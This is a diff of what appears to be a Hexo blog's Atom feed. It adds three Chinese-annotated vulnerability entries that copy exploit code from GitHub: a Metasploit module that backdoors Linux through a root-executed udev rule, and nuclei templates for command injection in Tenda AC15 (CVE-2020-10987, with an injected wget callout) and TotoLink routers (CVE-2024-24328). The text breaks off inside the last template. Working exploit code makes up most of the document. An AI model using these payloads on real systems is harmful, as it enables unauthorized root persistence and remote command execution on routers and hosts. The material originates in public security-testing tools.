@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-04T10:00:33.512Z</updated>
+  <updated>2025-06-04T11:15:37.457Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,148 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>udev persistence</title>
+    <link href="http://example.com/2025/06/04/github_1868489514/"/>
+    <id>http://example.com/2025/06/04/github_1868489514/</id>
+    <published>2025-06-04T11:15:37.460Z</published>
+    <updated>2025-06-04T11:15:37.457Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> udev persistence</p><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块会在&#x2F;lib&#x2F;udev&#x2F;rules.d&#x2F;中添加一个脚本，以便执行磁盘上的有效载荷。每次除l0之外的网络接口启动时，它都会以root权限执行。</p><p><strong>产品名称：</strong> udev</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/680638529298586ead0df35e71bb1a0c5683a924/modules%2Fexploits%2Flinux%2Flocal%2Fudev_persistence.rb">https://github.com/rapid7/metasploit-framework/blob/680638529298586ead0df35e71bb1a0c5683a924/modules%2Fexploits%2Flinux%2Flocal%2Fudev_persistence.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>##<br># This module requires Metasploit: https://metasploit.com/download<br># <span class="hljs-keyword">Current</span> source: https://github.com/rapid7/metasploit-framework<br>##<br><br><span class="hljs-keyword">class</span> MetasploitModule &lt; Msf::Exploit::<span class="hljs-keyword">Local</span><br><br>  Rank = GreatRanking<br><br>  <span class="hljs-keyword">include</span> Msf::Post::File<br>  <span class="hljs-keyword">include</span> Msf::Post::Unix<br><br>  def initialize(<span class="hljs-keyword">info</span> = &#123;&#125;)<br>    super(<br>      update_info(<br>        <span class="hljs-keyword">info</span>,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;udev persistence&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module will <span class="hljs-keyword">add</span> a script <span class="hljs-keyword">in</span> /lib/udev/rules.d/ <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> a payload written <span class="hljs-keyword">on</span> disk.<br>          It<span class="hljs-string">&#x27;ll be executed with root privileges everytime a network interface other than l0 comes up.</span><br><span class="hljs-string">        &#125;,</span><br><span class="hljs-string">        &#x27;</span>Licens<span class="hljs-string">e&#x27; =&gt; MSF_LICENSE,</span><br><span class="hljs-string">        &#x27;</span>Author<span class="hljs-string">&#x27; =&gt; [</span><br><span class="hljs-string">          &#x27;</span>Julien Voisin<span class="hljs-string">&#x27;</span><br><span class="hljs-string">        ],</span><br><span class="hljs-string">        &#x27;</span>Platform<span class="hljs-string">&#x27; =&gt; [ &#x27;</span>unix<span class="hljs-string">&#x27;, &#x27;</span>linux<span class="hljs-string">&#x27; ],</span><br><span class="hljs-string">        &#x27;</span>Arch<span class="hljs-string">&#x27; =&gt; ARCH_CMD,</span><br><span class="hljs-string">        &#x27;</span>SessionTypes<span class="hljs-string">&#x27; =&gt; [ &#x27;</span>shell<span class="hljs-string">&#x27;, &#x27;</span>meterpreter<span class="hljs-string">&#x27; ],</span><br><span class="hljs-string">        &#x27;</span>DefaultOptions<span class="hljs-string">&#x27; =&gt; &#123; &#x27;</span>WfsDelay<span class="hljs-string">&#x27; =&gt; 90_000 &#125;,</span><br><span class="hljs-string">        &#x27;</span>Targets<span class="hljs-string">&#x27; =&gt; [ [&#x27;</span>Automatic<span class="hljs-string">&#x27;, &#123;&#125;] ],</span><br><span class="hljs-string">        &#x27;</span>DefaultTarget<span class="hljs-string">&#x27; =&gt; 0,</span><br><span class="hljs-string">        &#x27;</span>DisclosureDat<span class="hljs-string">e&#x27; =&gt; &#x27;</span><span class="hljs-number">1999</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span><span class="hljs-string">&#x27;,</span><br><span class="hljs-string">        &#x27;</span>Passiv<span class="hljs-string">e&#x27; =&gt; true,</span><br><span class="hljs-string">        &#x27;</span>Stanc<span class="hljs-string">e&#x27; =&gt; Msf::Exploit::Stance::Passive,</span><br><span class="hljs-string">        &#x27;</span>Notes<span class="hljs-string">&#x27; =&gt; &#123;</span><br><span class="hljs-string">          &#x27;</span>Stability<span class="hljs-string">&#x27; =&gt; [],</span><br><span class="hljs-string">          &#x27;</span>Reliability<span class="hljs-string">&#x27; =&gt; [EVENT_DEPENDENT],</span><br><span class="hljs-string">          &#x27;</span>SideEffects<span class="hljs-string">&#x27; =&gt; [ARTIFACTS_ON_DISK]</span><br><span class="hljs-string">        &#125;,</span><br><span class="hljs-string">        &#x27;</span><span class="hljs-keyword">References</span><span class="hljs-string">&#x27; =&gt; [</span><br><span class="hljs-string">          [&#x27;</span>URL<span class="hljs-string">&#x27;, &#x27;</span>https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp<span class="hljs-string">&#x27;],</span><br><span class="hljs-string">          [&#x27;</span>URL<span class="hljs-string">&#x27;, &#x27;</span>https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-<span class="hljs-keyword">for</span>-persistence/<span class="hljs-string">&#x27;],</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      )</span><br><span class="hljs-string">    )</span><br><span class="hljs-string">    register_options([</span><br><span class="hljs-string"></span><br><span class="hljs-string">      OptString.new(&#x27;</span>PAYLOAD_PATH<span class="hljs-string">&#x27;, [false, &#x27;</span>The payload\<span class="hljs-string">&#x27;s path on disk&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]),<br>      OptString.<span class="hljs-built_in">new</span>(<span class="hljs-string">&#x27;BACKDOOR_PATH&#x27;</span>, [<span class="hljs-keyword">false</span>, <span class="hljs-string">&#x27;The backdoor\&#x27;</span>s <span class="hljs-type">path</span> <span class="hljs-keyword">on</span> disk<span class="hljs-string">&#x27;, &#x27;&#x27;])</span><br><span class="hljs-string">    ])</span><br><span class="hljs-string">  end</span><br><span class="hljs-string"></span><br><span class="hljs-string">  def get_command</span><br><span class="hljs-string">    unless executable? &#x27;</span>/usr/bin/at<span class="hljs-string">&#x27;</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &#x27;</span>The required /usr/bin/at binary was <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">on</span> the target<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string">    %(/usr/bin/at -M -f #&#123;@payload_path&#125; now)</span><br><span class="hljs-string">  end</span><br><span class="hljs-string"></span><br><span class="hljs-string">  def exploit</span><br><span class="hljs-string">    @payload_path = datastore[&#x27;</span>PAYLOAD_PATH<span class="hljs-string">&#x27;].blank? ? &#x27;</span>/usr/bin/<span class="hljs-string">&#x27; + Rex::Text.rand_text_alphanumeric(8) : datastore[&#x27;</span>PAYLOAD_PATH<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @backdoor_path = datastore[&#x27;</span>BACKDOOR_PATH<span class="hljs-string">&#x27;].blank? ? &#x27;</span>/lib/udev/rules.d/<span class="hljs-string">&#x27; + Rex::Text.rand_text_alphanumeric(8) + &#x27;</span>.rules<span class="hljs-string">&#x27; : datastore[&#x27;</span>BACKDOOR_PATH<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">    unless writable? File.dirname(@backdoor_path)</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &quot;#&#123;@backdoor_path&#125; is not writable&quot;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if exists? @backdoor_path</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &quot;#&#123;@backdoor_path&#125; is already present&quot;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string"></span><br><span class="hljs-string">    unless writable? File.dirname(@payload_path)</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &quot;#&#123;@payload_path&#125; is not writable&quot;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if exists? @payload_path</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &quot;#&#123;@payload_path&#125; is already present&quot;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string"></span><br><span class="hljs-string">    upload_and_chmodx(@payload_path, &quot;#!/bin/sh\n#&#123;payload.encoded&#125;&quot;)</span><br><span class="hljs-string">    print_status &quot;#&#123;@payload_path&#125; written&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    fail_with Failure::PayloadFailed, &#x27;</span>Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">write</span> UDEV fil<span class="hljs-string">e&#x27; unless write_file(@backdoor_path, %(SUBSYSTEM==&quot;net&quot;, KERNEL!=&quot;lo&quot;, RUN+=&quot;#&#123;get_command&#125;&quot;))</span><br><span class="hljs-string"></span><br><span class="hljs-string">    print_status &quot;#&#123;@backdoor_path&#125; written&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # need to trigger first rule manually</span><br><span class="hljs-string">    print_status &#x27;</span>Triggering udev rul<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">    cmd_exec(&#x27;</span>udevadm <span class="hljs-keyword">trigger</span> -v <span class="hljs-comment">--subsystem-match=net&#x27;)</span><br><br>    stime = <span class="hljs-type">Time</span>.now.to_f<br>    timeout = datastore[<span class="hljs-string">&#x27;ListenerTimeout&#x27;</span>].to_i<br>    <span class="hljs-keyword">loop</span> <span class="hljs-keyword">do</span><br>      break <span class="hljs-keyword">if</span> timeout &gt; <span class="hljs-number">0</span> &amp;&amp; (stime + timeout &lt; <span class="hljs-type">Time</span>.now.to_f)<br><br>      Rex::ThreadSafe.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; udev persistence&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/strong&gt; 权限提升&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞等级：&lt;/strong&gt; 高危&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞描述：&lt;/strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+    
+    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Tenda AC15 AC1900 命令注入漏洞</title>
+    <link href="http://example.com/2025/06/04/github_3395140682/"/>
+    <id>http://example.com/2025/06/04/github_3395140682/</id>
+    <published>2025-06-04T11:15:26.206Z</published>
+    <updated>2025-06-04T11:15:26.205Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Tenda AC15 AC1900 命令注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-10987</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Tenda AC15 AC1900版本15.03.05.19的goform&#x2F;setUsbUnload端点允许远程攻击者通过deviceName POST参数执行任意系统命令。</p><p><strong>产品厂商：</strong> tenda</p><p><strong>产品名称：</strong> ac15_firmware</p><p><strong>影响版本：</strong> 15.03.05.19</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/a700965181c4e419d8f9c1442414c2c4ef8db609/http%2Fcves%2F2020%2FCVE-2020-10987.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/a700965181c4e419d8f9c1442414c2c4ef8db609/http%2Fcves%2F2020%2FCVE-2020-10987.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2020-10987</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Tenda AC15 AC1900 version 15.03.05.19 - Command Injection</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pussycat0x</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">The goform/setUsbUnload endpoint of Tenda AC15 AC1900 version 15.03.05.19 allows remote attackers to execute arbitrary system commands via the deviceName POST parameter.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.ise.io/research/</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/20142995/Goby</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/NyxAzrael/Goby_POC</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/Ostorlab/KEV</span><br>  <span class="hljs-attribute">classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9.8</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2020-10987</span><br>    <span class="hljs-attribute">cwe-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CWE-78</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.90188</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.99558</span><br>    <span class="hljs-attribute">cpe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cpe:2.3:o:tenda:ac15_firmware:15.03.05.19:*:*:*:*:*:*:*</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">vendor</span><span class="hljs-punctuation">:</span> <span class="hljs-string">tenda</span><br>    <span class="hljs-attribute">product</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ac15_firmware</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2020,tenda,rce,kev,unauth</span><br><br><span class="hljs-attribute">variables</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">payload</span><span class="hljs-punctuation">:</span> <span class="hljs-string"> &quot;wget http://&#123;&#123;interactsh-url&#125;&#125;&quot;</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">POST /goform/setUsbUnload HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>        <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">*/*</span><br><br>        <span class="hljs-attribute">deviceName=test`;&#123;&#123;payload&#125;&#125;;`</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">    matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">interactsh_protocol</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;http&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Tenda AC15 AC1900 命令注入漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2020-10987&lt;/li&gt;
+&lt;/ul</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>TotoLink Router setMacFilterRules - Command Injection</title>
+    <link href="http://example.com/2025/06/04/github_447170763/"/>
+    <id>http://example.com/2025/06/04/github_447170763/</id>
+    <published>2025-06-04T11:15:14.870Z</published>
+    <updated>2025-06-04T11:15:14.869Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> TotoLink Router setMacFilterRules - Command Injection</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-24328</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> TotoLink Router的’setMacFilterRules’功能存在命令注入漏洞，允许未经授权的攻击者执行任意命令。</p><p><strong>产品厂商：</strong> totolink</p><p><strong>产品名称：</strong> a3300r_firmware</p><p><strong>影响版本：</strong> 17.0.0cu.557_b20221024</p><p><strong>搜索语法：</strong> title&#x3D;”totolink”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b1ec88434ccfe3dde93757d235e0f99185c9c2ea/http%2Fcves%2F2024%2FCVE-2024-24328.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b1ec88434ccfe3dde93757d235e0f99185c9c2ea/http%2Fcves%2F2024%2FCVE-2024-24328.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2024-24328</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TotoLink Router setMacFilterRules - Command Injection</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pussycat0x</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">This template checks for a command injection vulnerability in TotoLink Router&#x27;s &#x27;setMacFilterRules&#x27;</span><br><span class="hljs-attribute">    functionality. The vulnerability allows unauthorized attackers to execute arbitrary commands.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/12/TOTOlink%20A3300R%20setMacFilterRules.md</span><br>  <span class="hljs-attribute">classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9.8</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2024-24328</span><br>    <span class="hljs-attribute">cwe-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CWE-78</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.01075</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.76644</span><br>    <span class="hljs-attribute">cpe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cpe:2.3:o:totolink:a3300r_firmware:17.0.0cu.557_b20221024:*:*:*:*:*:*:*</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">vendor</span><span class="hljs-punctuation">:</span> <span class="hljs-string">totolink</span><br>    <span class="hljs-attribute">product</span><span class="hljs-punctuation">:</span> <span class="hljs-string">a3300r_firmware</span><br>    <span class="hljs-attribute">fofa-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">title=&quot;totolink&quot;</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2024,kev,totolink,routers,unauth,intrusive</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">POST /cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">83</span><br>        <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>        <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>        <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://&#123;&#123;BaseURL&#125;&#125;</span><br>        <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://&#123;&#123;RootURL&#125;&#125;/advance/portfwd.html?token=C6F41C563E86A379</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br>        <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br>        <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br><br>        &#123;&quot;enable&quot;:&quot;1`ls&gt;/web/&#123;&#123;randstr&#125;&#125;.txt`&quot;,&quot;addEffect&quot;:&quot;0&quot;,&quot;topicurl&quot;:&quot;setMacFilterRules&quot;&#125;<br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">GET /&#123;&#123;randstr&#125;&#125;.txt  HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://&#123;&#123;Hostname&#125;&#125;/advance/portfwd.html?token=C6F41C563E86A379</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br>        <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br>        <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: dsl</span><br>        <span class="hljs-attribute">dsl</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;status_code_1 == 200 &amp;&amp; status_code_2 == 200&#x27;</span><br>          <span class="hljs-bullet">-</span> <span 